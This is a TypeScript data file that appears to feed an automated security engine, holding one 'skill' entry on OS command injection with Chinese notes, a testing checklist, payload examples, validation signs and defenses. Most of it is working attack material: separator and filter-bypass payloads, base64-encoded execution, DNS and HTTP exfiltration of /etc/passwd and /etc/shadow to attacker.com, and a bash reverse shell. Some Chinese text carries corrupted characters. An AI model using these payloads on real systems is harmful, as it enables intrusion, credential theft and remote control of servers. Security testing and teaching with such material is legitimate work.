/**
 * HOS-Sec-Engine V2 - Command Injection Skills
 * 命令注入攻击专项 Skill 集合
 */

import { AttackDefenseSkill } from '\.\./\.\./\.\./types/skill';

export const commandInjectionSkills: AttackDefenseSkill[] = [
    {
        metadata: {
            id: 'web-rce-001',
            name: 'Command Injection Techniques',
            category: 'web',
            subCategory: 'command-injection',
            riskLevel: 'critical',
            confidence: 0.93,
            updatedAt: '2026-06',
            author: 'HOS-Sec-Engine',
            tags: ['command-injection', 'os-command-injection', 'rce', 'blind-command-injection', 'dns-exfiltration', 'filter-bypass'],
        },
        trigger: {
            scenarios: [
                '应用调用系统命令处理用户输入（如 ping、nslookup、tracert、convert、ffmpeg',
                '存在网络诊断工具（ping 测试、端口扫描、DNS 查询',
                '应用使用 system()、exec()、popen()、Runtime.exec() 等函',
                '文件处理功能调用外部程序（图像处理、文档转换、压缩解压）',
                '存在代码执行功能（在线编辑器、代码沙箱、REPL',
                '应用调用 shell 脚本或批处理文件处理用户数据',
            ],
            keywords: [
                'command injection',
                'os command injection',
                'rce',
                '远程代码执行',
                '命令注入',
                'system()',
                'exec()',
                'shell_exec',
                'Runtime.exec',
                'blind rce',
                'dns exfiltration',
                'ping',
                'traceroute',
            ],
            aliases: [
                'os command injection',
                'shell injection',
                'command execution',
                'blind command injection',
                '命令执行',
                '盲注命令注入',
                'oob rce',
            ],
            indicators: [
                '响应时间差异（命令执行延迟）',
                'DNS 查询日志中出现异常请',
                'HTTP 请求从服务器发往攻击者控制的地址',
                '错误信息暴露命令执行上下?',
            ],
        },
        knowledge: {
            description: '命令注入允许攻击者通过操控应用程序传递给操作系统 shell 的参数执行任意系统命令。与代码注入不同，命令注入直接执行操作系统命令，通常具有?Web 应用进程相同的权限级别。命令注入可分为有回显（输出直接返回）和盲注（无输出回显，需通过时间延迟、DNS 查询、HTTP 请求等带外通道验证）。现代应用中命令注入较少见但仍存在于网络诊断工具、图像处理、文档转换、系统管理等场景',
            symptoms: [
                '用户输入直接拼接到系统命令字符串',
                '网络诊断功能（ping、traceroute）的输入参数未经过滤',
                '命令执行结果的部分内容反映在响应',
                '响应时间与输入参数长度或内容相关',
                '错误信息暴露了底层命令的结构',
            ],
            rootCauses: [
                '使用不安全的函数执行系统命令（system、exec、shell_exec、popen',
                '用户输入直接拼接到命令字符串中，未使用参数化调用',
                '黑名单过滤不完整（遗漏命令分隔符、管道符、重定向符）',
                '对命令执行结果未做适当隔离，部分输出返回给用户',
                '应用以高权限运行（root/Administrator），放大命令注入影响',
                '外部程序调用时未限制参数范围',
            ],
            observations: [
                'Linux 命令分隔符：; | || && $(cmd) `cmd` 均可注入额外命令',
                'Windows 命令分隔符：& | || && ^ | 以及 %COMSPEC%',
                '盲注命令注入需要通过 side-channel（时间、DNS、HTTP）验',
                'DNS exfiltration 适合盲注场景，通过 $(cmd).attacker.com 外带命令输出',
                '空格和特殊字符的黑名单过滤可通过编码、变量、IFS 绕过',
                'Java Runtime.exec() 不使?shell 解析，命令分隔符无效，但可利用参数注',
                'Python subprocess.call(shell=True) 等同?system()，shell=False 更安',
                '命令注入与代码注入的区别：前者执?OS 命令，后者执行应用层代码',
            ],
            commonMistakes: [
                '只测?; ?| 分隔符，遗漏 &&、||、反引号',
                '盲注场景中未正确设置接收服务器捕获带外数',
                '未识别操作系统类型（Linux/Windows），使用不兼容的 payload',
                '空格被过滤时未尝?${IFS}??09 等替',
                '忽略 Java Runtime.exec() ?shell 调用的区',
                '未测试引?括号等过滤的绕过方式',
            ],
            notes: [
                '命令注入测试时应先用简?payload（如 ;id; ?|id|）确认漏洞存',
                '盲注场景优先使用时间延迟（sleep/ping -c）验证，再尝试数据外',
                'DNS exfiltration 需要注意输出长度限制（DNS 标签最?63 字符',
                '命令注入的利用权限取决于 Web 应用进程的运行用',
                '现代框架尽量避免直接调用系统命令，推荐使用原生库替代',
                'WAF 对命令注入的检测通常包括关键字（system、exec、|? 等）',
            ],
        },
        action: {
            checklist: [
                '识别用户输入是否被用于构造系统命',
                '测试基础命令分隔符（; | && ||',
                '确定操作系统类型（Linux/Windows',
                '确定是否有回显（输出是否返回到响应中',
                '无回显：使用时间延迟验证（sleep 5 / ping -n 5',
                '无回显：使用 DNS exfiltration 外带数据',
                '测试过滤绕过（空格、引号、关键字',
                '尝试获取反向 shell',
                '确定命令执行的权限级',
                '探索进一步利用（权限提升、横向移动）',
            ],
            techniques: [
                '命令分隔符注入：; | || && $(cmd) `cmd`',
                '盲注时间延迟：sleep 5（Linux）、ping -n 5 127.0.0.1（Windows/Linux',
                'DNS exfiltration?(whoami).attacker.com ?`whoami`.attacker.com',
                '空格绕过?{IFS}??09、{cmd,arg}?IFS$9',
                '引号绕过：使用变量拼接、hex 编码、base64 编码',
                '关键字绕过：字符拼接（a=ca;b=t;$a$b /etc/passwd',
                '编码绕过：base64 解码执行（echo xxx | base64 -d | bash',
                'HTTP exfiltration：curl http://attacker.com/$(whoami)',
                '反向 shell：bash -i >& /dev/tcp/attacker.com/4444 0>&1',
                'PowerShell 命令注入（Windows）：-EncodedCommand base64',
            ],
            examples: [
                {
                    name: '基础 OS 命令注入',
                    description: '利用命令分隔符在合法命令后注入额外命',
                    content: "场景: 应用执行 ping {user_input}\n" +
                        "\n" +
                        "Linux 注入:\n" +
                        "127.0.0.1;id\n" +
                        "127.0.0.1|id\n" +
                        "127.0.0.1&&id\n" +
                        "127.0.0.1||id\n" +
                        "127.0.0.1$(id)\n" +
                        "127.0.0.1`id`\n" +
                        "\n" +
                        "Windows 注入:\n" +
                        "127.0.0.1&whoami\n" +
                        "127.0.0.1|whoami\n" +
                        "127.0.0.1&&whoami\n" +
                        "127.0.0.1||whoami\n" +
                        "\n" +
                        "命令分隔符说?\n" +
                        ";     - 顺序执行，无论前一条是否成功\n" +
                        "|     - 管道符，前一条输出作为后一条输入\n" +
                        "||    - 前一条失败时执行后一条\n" +
                        "&&    - 前一条成功时执行后一条\n" +
                        "$()   - 命令替换，执行括号内命令并替换结果\n" +
                        "``    - 反引号，?$() 功能\n" +
                        "\n" +
                        "Payload 选择:\n" +
                        "- 有回? 127.0.0.1;id（输出直接显示）\n" +
                        "- 盲注: 127.0.0.1;sleep 5（通过响应时间判断?",
                },
                {
                    name: '盲注命令注入 - DNS Exfiltration',
                    description: '在无回显场景下，通过 DNS 查询外带命令执行结果',
                    content: "原理: 将命令输出拼接到 DNS 查询域名中\n" +
                        "攻击者监?DNS 查询日志获取命令输出\n" +
                        "\n" +
                        "Linux DNS Exfiltration:\n" +
                        "nslookup $(whoami).attacker.com\n" +
                        "dig $(id).attacker.com\n" +
                        "ping `cat /etc/passwd | head -1 | tr ':' '.'`.attacker.com\n" +
                        "\n" +
                        "Windows DNS Exfiltration:\n" +
                        "nslookup %USERNAME%.attacker.com\n" +
                        "ping %COMPUTERNAME%.attacker.com\n" +
                        "\n" +
                        "使用工具:\n" +
                        "1. 配置 burpcollaborator.com ?interact.sh 接收 DNS 查询\n" +
                        "2. 自建 DNS 服务器或使用 dnsbin.zhack.ca\n" +
                        "3. Payload: ping $(whoami).xxxxxx.burpcollaborator.net\n" +
                        "\n" +
                        "处理长输?\n" +
                        "for f in $(cat /etc/passwd | cut -d: -f1); do\n" +
                        "  nslookup $f.attacker.com;\n" +
                        "done\n" +
                        "\n" +
                        "Base64 编码输出:\n" +
                        "nslookup $(cat /etc/passwd | base64 | cut -c1-63).attacker.com\n" +
                        "\n" +
                        "注意: DNS 标签最?63 字符，长输出需要分?",
                },
                {
                    name: '空格过滤绕过',
                    description: '当空格被过滤时，使用替代方式在命令中表示空白字符',
                    content: "场景: 应用过滤了输入中的空格字符\n" +
                        "\n" +
                        "Linux 绕过方式:\n" +
                        "1. ${IFS}       - Shell 内部字段分隔符变量\n" +
                        "   cat${IFS}/etc/passwd\n" +
                        "\n" +
                        "2. ${IFS##9}    - IFS 的变体（去除数字 9）\n" +
                        "   cat${IFS##9}/etc/passwd\n" +
                        "\n" +
                        "3. $IFS$9       - IFS 后接 $9（第 9 个位置参数，通常为空）\n" +
                        "   cat$IFS$9/etc/passwd\n" +
                        "\n" +
                        "4. <            - 重定向符替代空格（仅用于文件参数）\n" +
                        "   cat</etc/passwd\n" +
                        "\n" +
                        "5. {cmd,arg}    - 大括号扩展\n" +
                        "   {cat,/etc/passwd}\n" +
                        "\n" +
                        "6. %09 / %0a    - URL 编码?Tab / 换行\n" +
                        "   cat%09/etc/passwd\n" +
                        "\n" +
                        "7. 制表?       - 直接插入 Tab 字符（\\t）\n" +
                        "   cat\\t/etc/passwd\n" +
                        "\n" +
                        "8. 变量赋?\n" +
                        "   a=/etc/passwd;cat$a\n" +
                        "\n" +
                        "Windows 绕过:\n" +
                        "1. %PROGRAMDATA:~0,1%  - 环境变量子串（通常为空格）\n" +
                        "2. 使用 Tab 键生成的空格\n" +
                        "3. 逗号替代空格（部分命令支持）: dir,c:\\",
                },
                {
                    name: '关键字黑名单绕过',
                    description: '当命令关键字（cat、ls、whoami 等）被过滤时，使用变体绕',
                    content: "场景: 应用过滤了常见命令关键字\n" +
                        "\n" +
                        "命令关键字绕?\n" +
                        "1. 反斜杠转? c\\at /etc/passwd\n" +
                        "2. 引号分割: ca''t /etc/passwd ?ca\"\"t /etc/passwd\n" +
                        "3. 变量拼接: a=c;b=at;$a$b /etc/passwd\n" +
                        "4. 反向引用: echo 'cat /etc/passwd' | rev | sh\n" +
                        "5. Base64: echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh\n" +
                        "6. Octal/Hex: $(printf '\\143\\141\\164') /etc/passwd\n" +
                        "7. 通配? /???/??t /???/p??s?? (匹配 /bin/cat /etc/passwd)\n" +
                        "8. 符号链接: ln -s /bin/cat /tmp/x; /tmp/x /etc/passwd\n" +
                        "\n" +
                        "关键字绕过矩?\n" +
                        "cat     ?c\\at, ca\"\"t, /???/??t, base64_decode\n" +
                        "ls      ?l\\s, l\"\"s, /???/ls, echo *\n" +
                        "whoami  ?who\\ami, who\"\"ami, id\n" +
                        "wget    ?w\\get, wge\\t, curl 替代\n" +
                        "bash    ?b\\ash, ba\\sh, sh, /bin/sh\n" +
                        "\n" +
                        "过滤绕过通用思路:\n" +
                        "1. 转义字符（\\、引号）\n" +
                        "2. 变量拼接\n" +
                        "3. 编码（base64、hex、octal）\n" +
                        "4. 通配符\n" +
                        "5. 替代命令",
                },
                {
                    name: 'Base64 编码命令注入',
                    description: '将命令进?base64 编码后通过解码执行，绕过关键字和特殊字符过',
                    content: "编码命令:\n" +
                        "echo 'cat /etc/passwd' | base64\n" +
                        "输出: Y2F0IC9ldGMvcGFzc3dkCg==\n" +
                        "\n" +
                        "注入 Payload:\n" +
                        "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh\n" +
                        "\n" +
                        "复杂命令:\n" +
                        "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' | base64\n" +
                        "Payload: echo {base64} | base64 -d | bash\n" +
                        "\n" +
                        "绕过过滤?\n" +
                        "如果 base64 也被过滤:\n" +
                        "echo Y2F0 | rev | base64 -d  (反向编码)\n" +
                        "printf '\\x63\\x61\\x74' (hex 编码)\n" +
                        "\n" +
                        "Python 编码:\n" +
                        "python -c 'import os; os.system(\"cat /etc/passwd\")'\n" +
                        "python3 -c 'import base64; exec(base64.b64decode(\"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2NhdCAvZXRjL3Bhc3N3ZCcp\"))'\n" +
                        "\n" +
                        "Perl 编码:\n" +
                        "perl -e 'print `cat /etc/passwd`'\n" +
                        "perl -MMIME::Base64 -e 'system(decode_base64(\"Y2F0IC9ldGMvcGFzc3dk\"))'\n" +
                        "\n" +
                        "适用场景:\n" +
                        "- 关键字过滤严格但允许 echo/base64\n" +
                        "- 需要注入包含特殊字符的复杂命令\n" +
                        "- 反向 shell payload 注入",
                },
                {
                    name: '带外 (OOB) HTTP 命令注入',
                    description: '通过 HTTP 请求将命令输出发送到攻击者控制的服务',
                    content: "Linux HTTP Exfiltration:\n" +
                        "curl http://attacker.com/$(whoami)\n" +
                        "curl http://attacker.com/$(id | base64)\n" +
                        "curl http://attacker.com/?data=$(cat /etc/passwd | base64)\n" +
                        "wget http://attacker.com/$(hostname)\n" +
                        "\n" +
                        "Windows HTTP Exfiltration:\n" +
                        "curl http://attacker.com/%USERNAME%\n" +
                        "powershell -c \"Invoke-WebRequest http://attacker.com/$env:USERNAME\"\n" +
                        "bitsadmin /transfer myjob http://attacker.com/%COMPUTERNAME%\n" +
                        "\n" +
                        "接收端设?(Python):\n" +
                        "from http.server import HTTPServer, BaseHTTPRequestHandler\n" +
                        "class Handler(BaseHTTPRequestHandler):\n" +
                        "    def do_GET(self):\n" +
                        "        print(f'Received: {self.path}')\n" +
                        "        self.send_response(200)\n" +
                        "        self.end_headers()\n" +
                        "HTTPServer(('', 80), Handler).serve_forever()\n" +
                        "\n" +
                        "使用协作平台:\n" +
                        "curl http://xxxxxx.oastify.com/$(whoami)\n" +
                        "curl http://xxxxxx.interact.sh/$(id)\n" +
                        "\n" +
                        "POST 方式 (适合大数?:\n" +
                        "curl -X POST -d \"$(cat /etc/passwd)\" http://attacker.com/\n" +
                        "wget --post-data=\"$(cat /etc/shadow)\" http://attacker.com/",
                },
                {
                    name: 'Java Runtime.exec() 命令注入',
                    description: '针对 Java Runtime.exec() 的特殊命令注入技',
                    content: "Java Runtime.exec() 特点:\n" +
                        "- 不使?shell 解析命令\n" +
                        "- 命令分隔?(; | && ||) 无效\n" +
                        "- 但可利用参数注入\n" +
                        "\n" +
                        "场景: Runtime.getRuntime().exec(\"ping \" + userInput)\n" +
                        "\n" +
                        "参数注入:\n" +
                        "userInput: -c 1 127.0.0.1; cat /etc/passwd\n" +
                        "实际执行: ping -c 1 127.0.0.1; cat /etc/passwd\n" +
                        "(注意: 如果 exec 传入的是字符串数组，?; 无效)\n" +
                        "\n" +
                        "如果 exec 传入字符?(shell=true 效果):\n" +
                        "Runtime.getRuntime().exec(\"bash -c {echo,Y2F0IC9ldGMvcGFzc3dk}|{base64,-d}|{bash,-i}\")\n" +
                        "\n" +
                        "Bash 特性利?\n" +
                        "1. bash -c \"command\" 可执行任意命令\n" +
                        "2. 环境变量: bash -c 'echo $PATH'\n" +
                        "3. Bash 通配? bash -c 'cat /etc/pass*'\n" +
                        "\n" +
                        "ProcessBuilder 注入:\n" +
                        "ProcessBuilder pb = new ProcessBuilder(\"cmd\", userInput);\n" +
                        "如果 userInput = \"/c\", \"calc.exe\" ?参数注入\n" +
                        "\n" +
                        "关键区别:\n" +
                        "exec(String)     ?通过 /bin/sh -c 执行，支持命令分隔符\n" +
                        "exec(String[])   ?直接执行，不支持命令分隔符\n" +
                        "ProcessBuilder   ?直接执行，不支持命令分隔?",
                },
            ],
        },
        validation: {
            indicators: [
                '命令执行结果出现?HTTP 响应',
                '响应时间明显延迟（sleep/ping 命令执行',
                '攻击者服务器收到来自目标?DNS 查询?HTTP 请求',
                '反向 shell 连接成功建立',
                '错误信息暴露命令执行上下?',
            ],
            successSigns: [
                'id/whoami 命令输出出现在响应中',
                'sleep/ping 命令导致响应时间增加对应秒数',
                'DNS 查询日志中出现包含命令输出的域名',
                'HTTP 服务器收到包含命令外带数据的请求',
                '反向 shell 在攻击者监听的端口上建立连',
                '文件读取命令（cat /etc/passwd）返回文件内?',
            ],
            falsePositiveSigns: [
                '响应延迟由网络波动而非 sleep 命令导致',
                'DNS 查询由其他机制触发（如页面加载外部资源）',
                '响应中的信息来自缓存或静态内容而非命令执行',
                '命令注入 payload 被当作普通字符串返回',
            ],
        },
        defense: {
            recommendations: [
                '避免调用系统命令，使用语言原生库替代（如使?Java InetAddress 替代 ping',
                '必须调用系统命令时，使用参数化调用（exec(String[]) 而非 exec(String)',
                '使用白名单验证输入：只允许预期的字符集（?IP 地址只允许数字和点）',
                '对用户输入进行严格的格式验证（正则匹?IP 地址、域名等',
                '避免使用 shell=true / shell=True 执行命令',
                '最小化应用进程权限，避免以 root/Administrator 运行',
                '使用 chroot 或容器隔离命令执行环',
                '对命令输出进行过滤，避免将敏感信息返回给用户',
            ],
            mitigations: [
                '实施输入验证和编码，拒绝包含命令分隔符的输入',
                '使用安全封装函数替代直接系统调用',
                '配置 WAF 规则检测命令注?payload? | && || $() 等）',
                '监控异常的系统进程创建（Web 进程不应创建 shell',
                '使用 AppArmor/SELinux 限制进程可执行的命令',
                '实施网络出站策略，限制应用服务器可访问的外部地址',
            ],
            references: [
                'https://owasp.org/www-community/attacks/Command_Injection',
                'https://portswigger.net/web-security/os-command-injection',
                'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html',
                'https://book.hacktricks.xyz/pentesting-web/command-injection',
                'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection',
            ],
        },
        quality: {
            confidence: 0.93,
            reviewed: true,
            tested: true,
            lastVerified: '2026-06',
        },
        enabled: true,
    },
];
